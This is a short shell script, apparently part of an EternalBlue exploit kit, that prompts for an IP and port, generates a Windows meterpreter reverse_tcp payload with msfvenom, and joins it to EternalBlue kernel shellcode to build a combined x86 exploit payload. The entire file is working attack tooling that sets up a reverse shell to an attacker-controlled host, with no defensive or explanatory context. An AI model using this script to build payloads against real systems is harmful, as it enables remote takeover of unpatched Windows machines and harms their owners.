echo "ip"
read ip
echo "port"
read port
msfvenom -p windows/meterpreter/reverse_tcp -f raw -o msf_$ip-$port-x86.bin EXITFUNC=thread LHOST=$ip LPORT=$port
cat eternalblue_kshellcode_x86 msf_$ip-$port-x86.bin > sc_x86_$ip-$port.bin
